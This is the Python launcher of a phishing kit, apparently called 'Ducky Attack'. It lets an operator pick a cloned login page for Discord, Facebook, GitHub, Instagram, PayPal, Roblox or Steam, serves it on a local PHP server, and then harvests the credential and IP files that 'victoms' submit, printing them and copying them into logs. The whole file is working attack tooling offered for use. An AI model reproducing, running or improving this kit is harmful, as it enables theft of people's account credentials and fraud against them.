import os, random
from colorama import Fore as c
from subprocess import DEVNULL, PIPE, Popen, STDOUT

def cat(file):
    if os.path.isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""
def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")
def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        print(e)

def run_hax(site):
    pending=f'{c.WHITE}[{c.BLUE}/{c.WHITE}] '
    good=f'{c.WHITE}[{c.GREEN}+{c.WHITE}] '
    err=f'{c.WHITE}[{c.RED}-{c.WHITE}] '

    print(pending, 'Staring PHP Server...')
    try:
        bgtask(f'php.exe.lnk -S localhost:8080 -t {site}')
        #os.system()
        print(good, 'PHP server is up at port: 8080')
    except:
        print(err, 'Failed to Start PHP server :(')
        exit()
    print(good, 'Link: http://localhost:8080')
    print(pending, 'Wating for victom to join...')
    #Here Where Bugs Started
    while True:
        user = f'{site}/usuarios.txt'
        if os.path.isfile(user):
            print(good, 'User Found!')
            print(cat(user))
            with open(f'{site}\old_victoms_users.txt', 'w') as old_victoms_users:
                with open(user, 'r') as current_victoms_users:
                    old_victoms_users.write(f"\n{current_victoms_users.read()}")
                    old_victoms_users.close()
                    current_victoms_users.close()
            os.remove(f'{site}/usuarios.txt')
        if os.path.isfile(f'{site}/ip.txt'):
            print(good, 'IP Found!')
            print(cat(f'{site}\ip.txt'))
            with open(f'{site}\old_victoms_ip.txt', 'w') as old_victoms_ips:
                with open(f'{site}\ip.txt', 'r') as current_victoms_ips:
                    old_victoms_ips.write(f"\n{current_victoms_ips.read()}")
                    old_victoms_ips.close()
                    current_victoms_ips.close()
            os.remove(f'{site}\ip.txt')
if __name__ == '__main__':
    os.system('cls')
    banner1 = f"""{c.RED}
 _____     __  __     ______     __  __     __  __        ______     ______   ______   ______     ______     __  __    
/\  __-.  /\ \/\ \   /\  ___\   /\ \/ /    /\ \_\ \      /\  __ \   /\__  _\ /\__  _\ /\  __ \   /\  ___\   /\ \/ /    
\ \ \/\ \ \ \ \_\ \  \ \ \____  \ \  _"-.  \ \____ \     \ \  __ \  \/_/\ \/ \/_/\ \/ \ \  __ \  \ \ \____  \ \  _"-.  
 \ \____-  \ \_____\  \ \_____\  \ \_\ \_\  \/\_____\     \ \_\ \_\    \ \_\    \ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\ 
  \/____/   \/_____/   \/_____/   \/_/\/_/   \/_____/      \/_/\/_/     \/_/     \/_/   \/_/\/_/   \/_____/   \/_/\/_/ 
                                                       {c.BLUE}#Made BY u7k1{c.RED}                                                                                                                       
{c.YELLOW}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"""
    banners=[banner1]
    print(random.choice(banners))
    print(f"""{c.RED}
    [0]     Discord
          
    [1]     Facebook
    
    [2]     Github
    
    [3]     Instagram
    
    [4]     Netflix
    
    [5]     Paypal
    
    [6]     Roblox
    
    [7]     Steam
""")
    s = int(input(f'{c.YELLOW}> '))
    if s == 0:
        run_hax(str(os.getcwd())+'\pages\discord_en')
    if s == 1:
        run_hax(str(os.getcwd())+'/pages/facebook_en')
    if s == 2:
        run_hax(str(os.getcwd())+'\pages\github')
    if s == 3:
        run_hax(str(os.getcwd())+'\pages\instagram')
    if s == 5:
        run_hax(str(os.getcwd())+'\pages\paypal')
    if s == 6:
        run_hax(str(os.getcwd())+'\pages\roblox_en')
    if s == 7:
        run_hax(str(os.getcwd())+'\pages\Steam_en')
    
    